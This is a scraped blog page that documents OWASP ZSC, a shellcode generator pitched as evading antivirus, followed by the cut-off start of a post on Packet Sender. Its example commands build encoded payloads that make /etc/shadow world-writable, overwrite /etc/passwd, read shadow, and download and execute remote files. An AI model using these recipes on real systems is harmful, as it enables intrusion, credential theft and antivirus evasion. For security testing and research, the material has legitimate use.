     <h1 class="post-title entry-title" itemprop="name headline"> OWASP ZSC Shellcoder - Generate Customized Shellcodes  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-8838570509661141065" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://2.bp.blogspot.com/-DX6yLkBF_0M/VdCuBvoMOvI/AAAAAAAAEfA/0lVnARMrwwk/s1600/ZSC.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-DX6yLkBF_0M/VdCuBvoMOvI/AAAAAAAAEfA/0lVnARMrwwk/s640/ZSC.png"></a>
      </div> 
      <br> 
      <br> 
      <div style="text-align: justify;"> 
       <b>OWASP ZSC</b> is an open source software in python language which lets you generate customized shellcodes for listed operation systems. This software can be run on Windows/Linux&amp;Unix/OSX and others OS under python 2.7.x.
      </div> 
      <a name="more"></a>
      <br> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;"> Description</span></b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b>Usage of shellcodes</b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Shellcodesare small codes in assembly which could be use as the payload in software exploiting. Other usages are in malwares, bypassing antiviruses, obfuscated codes and etc. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b>Why use OWASP ZSC&nbsp;?</b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        According to other shellcode generators same as metasploit tools and etc, OWASP ZSC using new encodes and methods which antiviruses won't detect. OWASP ZSC encoderes are able to generate shellcodes with 
       <b>random encodes</b> and that's lets you to get 
       <b>thousands new dynamic shellcodes</b> with same job in just a second,that means you will not get a same code if you use random encodes with same commands, And that make OWASP ZSC one of the bests! otherwise it's gonna generate shellcodes for many operation systems in next versions.
      </div> 
      <br> 
      <b> Help Menu</b>
      <br> 
      <pre><code>Switches:
-h, --h, -help, --help =&gt; to see this help guide
-os =&gt; choose your os to create shellcode
-oslist   =&gt; list os for switch -os
-o =&gt; output filename
-job =&gt; what shellcode gonna do for you&nbsp;?
-joblist =&gt; list of -job switch
-encode =&gt; generate shellcode with encode
-types =&gt; types of encode for -encode switch
-wizard =&gt; wizard mod

-update =&gt; check for update
-about =&gt; about software and developers.</code></pre> With these switch you can see the oslist,encode types and functions [joblist] to generate your shellcode.
      <br> OS List "
      <strong>-oslist</strong>" 
      <br> 
      <pre><code>[+] linux_x86
[+] linux_x64
[+] linux_arm
[+] linux_mips
[+] freebsd_x86
[+] freebsd_x64
[+] windows_x86
[+] windows_x64
[+] osx
[+] solaris_x86
[+] solaris_x64
</code></pre> Encode Types "
      <strong>-types</strong>" 
      <br> 
      <pre><code>[+] none
[+] xor_random
[+] xor_yourvalue
[+] add_random
[+] add_yourvalue
[+] sub_random
[+] sub_yourvalue
[+] inc
[+] inc_timesyouwant
[+] dec
[+] dec_timesyouwant
[+] mix_all
</code></pre> Functions "
      <strong>-joblist</strong>" 
      <br> 
      <pre><code>[+] exec('/path/file')
[+] chmod('/path/file','permission number')
[+] write('/path/file','text to write')
[+] file_create('/path/file','text to write')
[+] dir_create('/path/folder')
[+] download('url','filename')
[+] download_execute('url','filename','command to execute')
[+] system('command to execute')
[+] script_executor('name of script','path and name of your script in your pc','execute command')
</code></pre> 
      <br> Now you are able to choose your operation system, function, and encode to generate your shellcode, But all of these features are not activated yet, so you have to look up this table 
      <a class="external text" href="http://zsc.z3r0d4y.com/table.html" rel="nofollow">HERE</a> to see what features are activated.
      <br> 
      <br> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://3.bp.blogspot.com/-WtvDG0u1dPg/VdCuyibFkiI/AAAAAAAAEfI/YrGDuGJuRIg/s1600/ZSC-table.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="183" src="http://3.bp.blogspot.com/-WtvDG0u1dPg/VdCuyibFkiI/AAAAAAAAEfI/YrGDuGJuRIg/s640/ZSC-table.png" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        For example, this part of table telling us all functions for linux_x86 is activated, But 
       <strong>Encodes</strong> [xor_random, xor_yourvalue, add_random, add_yourvalue, sub_random, sub_yourvalue, inc, inc_timesyouwant, dec, dec_timesyouwant] are just activated for 
       <strong>chmod()</strong> function. 
      </div> 
      <br> 
      <b> Examples</b>
      <br> 
      <pre><code>&gt;zsc -os linux_x86 -encode inc -job "chmod('/etc/passwd','777')" -o file
&gt;zsc -os linux_x86 -encode dec -job "chmod('/etc/passwd','777')" -o file
&gt;zsc -os linux_x86 -encode inc_10 -job "chmod('/etc/passwd','777')" -o file
&gt;zsc -os linux_x86 -encode dec_30 -job "chmod('/etc/passwd','777')" -o file
&gt;zsc -os linux_x86 -encode xor_random -job "chmod('/etc/shadow','777')" -o file.txt
&gt;zsc -os linux_x86 -encode xor_random -job "chmod('/etc/passwd','444')" -o file.txt
&gt;zsc -os linux_x86 -encode xor_0x41414141 -job "chmod('/etc/shadow','777')" -o file.txt
&gt;zsc -os linux_x86 -encode xor_0x45872f4d -job "chmod('/etc/passwd','444')" -o file.txt
&gt;zsc -os linux_x86 -encode add_random -job "chmod('/etc/passwd','444')" -o file.txt
&gt;zsc -os linux_x86 -encode add_0x41414141 -job "chmod('/etc/passwd','777')" -o file.txt
&gt;zsc -os linux_x86 -encode sub_random -job "chmod('/etc/passwd','777')" -o file.txt
&gt;zsc -os linux_x86 -encode sub_0x41414141 -job "chmod('/etc/passwd','444')" -o file.txt
&gt;zsc -os linux_x86 -encode none -job "file_create('/root/Desktop/hello.txt','hello')" -o file.txt
&gt;zsc -os linux_x86 -encode none -job "file_create('/root/Desktop/hello2.txt','hello[space]world[space]!')" -o file.txt
&gt;zsc -os linux_x86 -encode none -job "dir_create('/root/Desktop/mydirectory')" -o file.txt
&gt;zsc -os linux_x86 -encode none -job "download('http://www.z3r0d4y.com/exploit.type','myfile.type')" -o file.txt
&gt;zsc -os linux_x86 -encode none -job "download_execute('http://www.z3r0d4y.com/exploit.type','myfile.type','./myfile.type')" -o file.txt
#multi command
&gt;zsc -os linux_x86 -encode none -job "download_execute('http://www.z3r0d4y.com/exploit.type','myfile.type','chmod[space]777[space]myfile.type;sh[space]myfile.type')" -o file.txt
&gt;zsc -os linux_x86 -encode none -job "script_executor('script.type','D:\\myfile.type','./script.type')" -o file.txt
&gt;zsc -os linux_x86 -encode none -job "script_executor('z3r0d4y.sh','/root/z3r0d4y.sh','sh[space]z3r0d4y.sh')" -o file.txt
&gt;zsc -os linux_x86 -encode none -job "script_executor('ali.py','/root/Desktop/0day.py','chmod[space]+x[space]ali.py;[space]python[space]ali.py')" -o file.txt
&gt;zsc -os linux_x86 -encode none -job "system('ls')" -o file.txt
&gt;zsc -os linux_x86 -encode none -job "system('ls[space]-la')" -o file.txt
&gt;zsc -os linux_x86 -encode none -job "system('ls[space]-la[space]/etc/shadow;chmod[space]777[space]/etc/shadow;ls[space]-la[space]/etc/shadow;cat[space]/etc/shadow;wget[space]file[space];chmod[space]777[space]file;./file')" -o file.txt
&gt;zsc -os linux_x86 -encode none -job "system('wget[space]file;sh[space]file')" -o file.txt
&gt;zsc -os linux_x86 -encode none -job "chmod('/etc/shadow','777')" -o file.txt
&gt;zsc -os linux_x86 -encode none -job "write('/etc/passwd','user:pass')" -o file.txt
&gt;zsc -os linux_x86 -encode none -job "exec('/bin/bash')" -o file.txt
</code></pre> 
      <div style="text-align: justify;"> 
       <strong>Note</strong>: Don’t use space ‘ ’ in system() function, replace it with “[space]” , software will detect and replace “ ” for you in shellcode. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>Note</strong>: script_executor(),download_execute(),download(),dir_create(),file_create() are using linux command line , not the function. [wget,mkdir,echo] system() function added in script, you can use it to do anything and generate any command line shellcode. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>Note</strong>: exec() doesn’t support any ARGV same as exec(‘/bin/bash -c ls’) or exec(‘/bin/bash’,‘-c’,‘ls’), you have to wait for next version and this feature will available in system() 
      </div> 
      <div style="text-align: justify;"> 
       <strong>Note</strong>: you also can use high value for inc and dec time, like inc_100000, your shellcode may get too big 
      </div> 
      <div style="text-align: justify;"> 
       <strong>Note</strong>: each time you execute chmod()[or any other] function with random encode, you are gonna get random outputs and different shellcode. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>Note</strong>: your xor value could be anything. “xor_0x41414141” and “xor_0x45872f4d” are examples. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b>Wizard Switch</b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        With 
       <strong>-wizard</strong> switch you are able to generate shellcode without long ARGVs, software will ask you for information.
      </div> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://1.bp.blogspot.com/-MFvmsEfz9MA/VdCvKICcHHI/AAAAAAAAEfQ/KcAiwfDCa7k/s1600/ZSC-img2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="294" src="http://1.bp.blogspot.com/-MFvmsEfz9MA/VdCvKICcHHI/AAAAAAAAEfQ/KcAiwfDCa7k/s640/ZSC-img2.png" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;"> 
       <strong>Note</strong>: While you are using 
       <strong>-wizard</strong> switch, if you push “
       <strong>Enter</strong>” without typing anything, the default value will be set on the varible. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>Note</strong>: With entering “
       <strong>list</strong>”, List of values will be shown.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;"> Available Features</span></b>
      </div> 
      <div> 
       <div> 
        <ul> 
         <li style="text-align: justify;">add length calculator for output</li> 
         <li style="text-align: justify;">add filename writer in gcc commandline in output file</li> 
         <li style="text-align: justify;">fixed bug in encoding module not available.</li> 
         <li style="text-align: justify;">fixed bug in os module not available</li> 
         <li style="text-align: justify;">add “-wizard” switch</li> 
         <li style="text-align: justify;">add installer “use ‘zsc’ commandline in terminal after installed”</li> 
         <li style="text-align: justify;">add uninstaller</li> 
         <li style="text-align: justify;">This Software just could be run on linux since this version</li> 
         <li style="text-align: justify;">change output to .c file and automated shellcode generating</li> 
         <li style="text-align: justify;">add color output for termina</li> 
         <li style="text-align: justify;">add inc encoding chmod() [linux_x86]</li> 
         <li style="text-align: justify;">add inc_timesyouwant chmod() [linux_x86]</li> 
         <li style="text-align: justify;">add dec encoding chmod() [linux_x86]</li> 
         <li style="text-align: justify;">add dec_timesyouwant chmod() [linux_x86]</li> 
         <li style="text-align: justify;">add features table inside “features_table.html”</li> 
         <li style="text-align: justify;">add -about to menu for developers name and etc</li> 
         <li style="text-align: justify;">fixed permission number calculating in chmod() [linux_x86]</li> 
         <li style="text-align: justify;">software’s signature changes</li> 
         <li style="text-align: justify;">bug fix reported by user in executing on linux , color function</li> 
         <li style="text-align: justify;">add xor_random encoding chmod() [linux_x86]</li> 
         <li style="text-align: justify;">add xor_yourvalue encoding chmod() [linux_x86]</li> 
         <li style="text-align: justify;">add add_random encoding chmod() [linux_x86]</li> 
         <li style="text-align: justify;">add add_yourvalue encoding chmod() [linux_x86]</li> 
         <li style="text-align: justify;">add sub_random encoding chmod() [linux_x86]</li> 
         <li style="text-align: justify;">add sub_yourvalue encoding chmod() [linux_x86]</li> 
         <li style="text-align: justify;">fixed shellcode encode type checking</li> 
         <li style="text-align: justify;">[linux_x86 modules completed]</li> 
         <li style="text-align: justify;">add script_executor() [linux - using command execution]</li> 
         <li style="text-align: justify;">add download_execute() [linux_x86 - using command execution (wget)]</li> 
         <li style="text-align: justify;">add download() [linux_x86 - using command execution (wget)]</li> 
         <li style="text-align: justify;">add dir_create() [linux_x86 using command execution]</li> 
         <li style="text-align: justify;">add file_create() [linux_x86 using command execution]</li> 
         <li style="text-align: justify;">add encodes file for next version released</li> 
         <li style="text-align: justify;">add system() [linux_x86 command execute]</li> 
         <li style="text-align: justify;">fixed chmod filename ¼ char length [linux_x86]</li> 
         <li style="text-align: justify;">fixed exec filename ¼ char length [linux_x86]</li> 
         <li style="text-align: justify;">fixed write filename ¼ length [linux_x86]</li> 
         <li style="text-align: justify;">fixed write content ¼ length [linux_x86]</li> 
         <li style="text-align: justify;">fixed write length calculator [linux_x86]</li> 
         <li style="text-align: justify;">and fixed some other bugs in coding [core]</li> 
         <li style="text-align: justify;">system() function added in script, you can use it to do anything and generate any command line shellcode.</li> 
         <li style="text-align: justify;">add chmod() [linux_x86] -&gt; chmod(‘/path/file’,‘perm_num’)</li> 
         <li style="text-align: justify;">add write() [linux_x86] -&gt; write(‘/path/file’,‘content’)</li> 
         <li style="text-align: justify;">add exec() [linux_x86] -&gt; exec(‘/path/file’)</li> 
         <li style="text-align: justify;">add encode [none - all os]</li> 
         <li style="text-align: justify;">add mix_all encoding in chmod() [linux_x86]</li> 
         <li style="text-align: justify;">add xor_random encoding in system() [linux_x86]</li> 
         <li style="text-align: justify;">add xor_yourvalue encoding in system() [linux_x86]</li> 
         <li style="text-align: justify;">add add_random encoding in system() [linux_x86]</li> 
         <li style="text-align: justify;">add add_yourvalue encoding in system() [linux_x86]</li> 
         <li style="text-align: justify;">add sub_random encoding in system() [linux_x86</li> 
         <li style="text-align: justify;">add sub_yourvalue encoding in system() [linux_x86]</li> 
         <li style="text-align: justify;">add inc encoding in system() [linux_x86]</li> 
         <li style="text-align: justify;">add inc_timesyouwant encoding in system() [linux_x86</li> 
         <li style="text-align: justify;">add dec encoding in system() [linux_x86]</li> 
         <li style="text-align: justify;">add dec_timesyouwant encoding in system() [linux_x86]</li> 
         <li style="text-align: justify;">add mix_all encoding in system() [linux_x86]</li> 
         <li style="text-align: justify;">add xor_random encoding in file_create() [linux_x86]</li> 
         <li style="text-align: justify;">add xor_yourvalue encoding in file_create() [linux_x86]</li> 
         <li style="text-align: justify;">add add_random encoding in file_create() [linux_x86]</li> 
         <li style="text-align: justify;">add add_yourvalue encoding in file_create() [linux_x86]</li> 
         <li style="text-align: justify;">add sub_random encoding in file_create() [linux_x86</li> 
         <li style="text-align: justify;">add sub_yourvalue encoding in file_create() [linux_x86]</li> 
         <li style="text-align: justify;">add inc encoding in file_create() [linux_x86]</li>

         <li style="text-align: justify;">add dec_timesyouwant encoding in file_create() [linux_x86]</li> 
         <li style="text-align: justify;">add mix_all encoding in file_create() [linux_x86]</li> 
         <li style="text-align: justify;">add xor_random encoding in dir_create() [linux_x86]</li> 
         <li style="text-align: justify;">add xor_yourvalue encoding in dir_create() [linux_x86]</li> 
         <li style="text-align: justify;">add add_random encoding in dir_create() [linux_x86]</li>

         <li style="text-align: justify;">add dec encoding in system() [linux_x86]</li> 
         <li style="text-align: justify;">add dec_timesyouwant encoding in system() [linux_x86]</li> 
         <li style="text-align: justify;">add mix_all encoding in system() [linux_x86]</li> 
         <li style="text-align: justify;">add xor_random encoding in script_executor() [linux_x86]</li> 
         <li style="text-align: justify;">add xor_yourvalue encoding in script_executor() [linux_x86]</li> 
         <li style="text-align: justify;">add add_random encoding in script_executor() [linux_x86]</li> 
         <li style="text-align: justify;">add add_yourvalue encoding in script_executor() [linux_x86]</li> 
         <li style="text-align: justify;">add sub_random encoding in script_executor() [linux_x86</li> 
         <li style="text-align: justify;">add sub_yourvalue encoding in script_executor() [linux_x86]</li> 
         <li style="text-align: justify;">add inc encoding in script_executor() [linux_x86]</li>

         <li style="text-align: justify;">add dec encoding in script_executor() [linux_x86]</li> 
         <li style="text-align: justify;">add dec_timesyouwant encoding in script_executor() [linux_x86]</li> 
         <li style="text-align: justify;">add mix_all encoding in script_executor() [linux_x86]</li> 
         <li style="text-align: justify;">add add_random encoding in write() [linux_x86]</li> 
         <li style="text-align: justify;">add xor_random encoding in write() [linux_x86]</li> 
         <li style="text-align: justify;">add sub_random encoding in write() [linux_x86]</li> 
         <li style="text-align: justify;">add xor_random encoding in exec() [linux_x86]</li> 
         <li style="text-align: justify;">add sub_random encoding in exec() [linux_x86</li> 
         <li style="text-align: justify;">add add_random encoding in exec() [linux_x86]</li> 
         <li style="text-align: justify;">fixed bug in system() when len(command) is less than 5</li> 
         <li style="text-align: justify;">fixed bug in encode module add_random chmod() [linux_x86]&nbsp;</li> 
        </ul> 
        <div> 
         <br>
        </div> 
       </div> 
      </div>

       <div style="text-align: center;">

     <h1 class="post-title entry-title" itemprop="name headline"> Packet Sender - The UDP and TCP Network Test Utility  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-7710037331045711268" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://2.bp.blogspot.com/-bzhPgrqBZDY/VTz78gq5W0I/AAAAAAAAD6U/fBlzcXdvERo/s1600/packet_sender.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-bzhPgrqBZDY/VTz78gq5W0I/AAAAAAAAD6U/fBlzcXdvERo/s1600/packet_sender.png" height="496" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        Packet Sender is an open source utility to allow sending and receiving TCP and UDP packets. It is available free (no ads / no bundleware) for 
       <b>Windows</b>, 
       <b>Mac</b>, and 
       <b>Linux</b>. It can be used for both commercial and personal use (license). It's designed to be v
      </div>
